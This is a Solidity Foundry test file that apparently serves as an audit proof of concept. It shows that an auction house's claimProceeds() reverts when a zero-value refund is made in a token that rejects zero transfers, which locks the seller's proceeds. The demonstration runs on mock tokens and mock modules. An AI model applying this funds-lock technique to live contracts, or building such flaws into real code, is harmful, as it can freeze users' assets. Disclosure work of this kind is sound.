// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Test framework
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

// Libraries
import {ERC20} from "solmate/tokens/ERC20.sol";

// Mocks
import {MockBatchAuctionModule} from "test/modules/Auction/MockBatchAuctionModule.sol";
import {Permit2User} from "test/lib/permit2/Permit2User.sol";

// Auctions
import {AuctionHouse} from "src/AuctionHouse.sol";
import {Auction} from "src/modules/Auction.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {ICallback} from "src/interfaces/ICallback.sol";

import {Keycode, keycodeFromVeecode, toKeycode} from "src/modules/Modules.sol";

/// @notice Mock ERC20 token that reverts on zero-value transfers
/// @dev This simulates tokens like LEND that revert when transferring 0 amount
contract RevertOnZeroTransferERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(amount > 0, "ZERO_TRANSFER");
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(amount > 0, "ZERO_TRANSFER");
        return super.transferFrom(from, to, amount);
    }
}

/// @notice Mock ERC20 token for quote token (normal behavior)
contract MockQuoteToken is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @title ExploitTest
/// @notice PoC demonstrating that seller's funds can be locked when baseToken reverts on zero transfers
/// @dev This test demonstrates the vulnerability in AuctionHouse::claimProceeds() where:
///      1. A batch auction is created with a token that reverts on zero-value transfers
///      2. The auction settles with all capacity sold (prefundingRefund = 0)
///      3. When seller tries to claim proceeds, the transaction reverts due to zero transfer
///      4. Seller's quote tokens remain locked in the contract forever
contract ExploitTest is Test, Permit2User {
    AuctionHouse internal auctionHouse;
    MockBatchAuctionModule internal batchAuctionModule;

    RevertOnZeroTransferERC20 internal baseToken;
    MockQuoteToken internal quoteToken;

    address internal constant SELLER = address(0x1);
    address internal constant PROTOCOL = address(0x2);
    address internal constant CURATOR = address(0x3);
    address internal constant BIDDER = address(0x4);

    uint96 internal constant LOT_CAPACITY = 10e18;
    uint48 internal startTime;
    uint48 internal constant DURATION = 1 days;

    uint96 internal lotId;

    function setUp() public {
        // Set block timestamp
        vm.warp(1_000_000);

        // Deploy tokens
        // Base token reverts on zero transfers (simulating LEND and similar tokens)
        baseToken = new RevertOnZeroTransferERC20("Base Token", "BASE", 18);
        quoteToken = new MockQuoteToken("Quote Token", "QUOTE", 18);

        // Deploy AuctionHouse
        auctionHouse = new AuctionHouse(address(this), PROTOCOL, _permit2Address);

        // Deploy and install batch auction module
        batchAuctionModule = new MockBatchAuctionModule(address(auctionHouse));
        auctionHouse.installModule(batchAuctionModule);

        startTime = uint48(block.timestamp) + 1;

        // Mint tokens to seller for prefunding
        vm.startPrank(SELLER);
        baseToken.mint(SELLER, LOT_CAPACITY);
        baseToken.approve(address(auctionHouse), LOT_CAPACITY);
        vm.stopPrank();

        // Mint quote tokens to bidder
        quoteToken.mint(BIDDER, 100e18);
    }

    /// @notice Test demonstrating the vulnerability where seller's funds get locked
    /// @dev Attack scenario:
    ///      1. Seller creates a batch auction with a revert-on-zero-transfer token
    ///      2. Auction settles with full capacity sold (no refund needed)
    ///      3. prefundingRefund = routing.funding + payoutSent_ - sold_ = 0
    ///      4. claimProceeds() attempts to transfer 0 tokens, which reverts
    ///      5. Seller cannot claim their quote tokens (proceeds from the auction)
    function test_SellerFundsLockedDueToZeroTransferRevert() public {
        // ============ STEP 1: Create auction ============
        // Seller creates a batch auction with the revert-on-zero-transfer base token
        vm.startPrank(SELLER);

        Auctioneer.RoutingParams memory routingParams = Auctioneer.RoutingParams({
            auctionType: keycodeFromVeecode(batchAuctionModule.VEECODE()),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: toKeycode(""),
            derivativeParams: abi.encode(""),
            wrapDerivative: false,
            prefunded: true  // Batch auctions must be prefunded
        });

        Auction.AuctionParams memory auctionParams = Auction.AuctionParams({
            start: startTime,
            duration: DURATION,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: abi.encode("")
        });

        lotId = auctionHouse.auction(routingParams, auctionParams, "");
        vm.stopPrank();

        console2.log("Auction created with lotId:", lotId);
        console2.log("Seller's base token balance after auction creation:", baseToken.balanceOf(SELLER));
        console2.log("AuctionHouse base token balance:", baseToken.balanceOf(address(auctionHouse)));

        // ============ STEP 2: Simulate bidding ============
        // Bidders place bids and send quote tokens to the auction house
        vm.startPrank(BIDDER);
        quoteToken.approve(address(auctionHouse), LOT_CAPACITY);
        vm.stopPrank();

        // Simulate that quote tokens were collected (transfer to auction house)
        // In a real scenario, this would happen through the bid() function
        vm.prank(BIDDER);
        quoteToken.transfer(address(auctionHouse), LOT_CAPACITY);

        // ============ STEP 3: Simulate auction settlement ============
        // Fast forward past auction end
        vm.warp(startTime + DURATION + 1);

        // Set settlement data where ALL capacity is sold
        // This means: payoutSent_ = sold_ = LOT_CAPACITY
        // Therefore: prefundingRefund = routing.funding + payoutSent_ - sold_ = LOT_CAPACITY + LOT_CAPACITY - LOT_CAPACITY = 0
        batchAuctionModule.setLotSettlement(
            lotId,
            Auction.Settlement({
                totalIn: LOT_CAPACITY,      // Quote tokens received
                totalOut: LOT_CAPACITY,     // Base tokens sold (full capacity)
                pfBidder: address(0),       // No partial fill
                pfReferrer: address(0),
                pfRefund: 0,
                pfPayout: 0,
                auctionOutput: ""
            })
        );

        // Settle the auction
        auctionHouse.settle(lotId);

        console2.log("\n=== After Settlement ===");
        console2.log("AuctionHouse quote token balance:", quoteToken.balanceOf(address(auctionHouse)));

        // ============ STEP 4: Demonstrate the vulnerability ============
        // Seller tries to claim proceeds but transaction reverts
        // This is because prefundingRefund = 0, and the baseToken reverts on zero transfers

        console2.log("\n=== Attempting to claim proceeds ===");
        console2.log("This will revert because prefundingRefund = 0 and baseToken reverts on zero transfers");

        vm.startPrank(SELLER);

        // This call should revert with "TRANSFER_FAILED" (SafeTransferLib wraps the revert)
        // The underlying cause is the baseToken reverting on zero transfer
        vm.expectRevert("TRANSFER_FAILED");
        auctionHouse.claimProceeds(lotId, "");

        vm.stopPrank();

        console2.log("\n=== VULNERABILITY CONFIRMED ===");
        console2.log("Seller's quote tokens are locked in AuctionHouse:", quoteToken.balanceOf(address(auctionHouse)));
        console2.log("Seller cannot claim proceeds due to zero transfer revert");

        // Verify that the quote tokens are indeed locked in the contract
        uint256 lockedQuoteTokens = quoteToken.balanceOf(address(auctionHouse));
        assertGt(lockedQuoteTokens, 0, "Quote tokens should be locked in AuctionHouse");

        // Verify seller cannot access their funds
        assertEq(quoteToken.balanceOf(SELLER), 0, "Seller should have 0 quote tokens");
    }

    /// @notice Additional test showing the vulnerability occurs even with partial settlement
    /// @dev When payoutSent_ equals sold_, prefundingRefund is still 0
    function test_SellerFundsLockedWithPartialSettlement() public {
        // Create auction
        vm.startPrank(SELLER);

        Auctioneer.RoutingParams memory routingParams = Auctioneer.RoutingParams({
            auctionType: keycodeFromVeecode(batchAuctionModule.VEECODE()),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: toKeycode(""),
            derivativeParams: abi.encode(""),
            wrapDerivative: false,
            prefunded: true
        });

        Auction.AuctionParams memory auctionParams = Auction.AuctionParams({
            start: startTime,
            duration: DURATION,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: abi.encode("")
        });

        lotId = auctionHouse.auction(routingParams, auctionParams, "");
        vm.stopPrank();

        // Fast forward and settle with partial fill
        vm.warp(startTime + DURATION + 1);

        uint96 partialAmount = 5e18;

        // Settlement where only partial capacity is sold
        // But with a partial fill bid that consumes the remaining capacity
        batchAuctionModule.setLotSettlement(
            lotId,
            Auction.Settlement({
                totalIn: partialAmount,
                totalOut: partialAmount,
                pfBidder: BIDDER,
                pfReferrer: address(0),
                pfRefund: 0,
                pfPayout: LOT_CAPACITY - partialAmount,  // Partial fill payout
                auctionOutput: ""
            })
        );

        auctionHouse.settle(lotId);

        // In this case:
        // routing.funding after settle = LOT_CAPACITY - pfPayout = partialAmount
        // payoutSent_ = 0 (no additional payouts in claimProceeds)
        // sold_ = partialAmount
        // prefundingRefund = partialAmount + 0 - partialAmount = 0

        console2.log("\n=== Partial Settlement Case ===");
        console2.log("Attempting to claim proceeds with zero refund...");

        vm.startPrank(SELLER);
        vm.expectRevert("TRANSFER_FAILED");
        auctionHouse.claimProceeds(lotId, "");
        vm.stopPrank();

        console2.log("Seller's funds are locked even with partial settlement");
    }
}
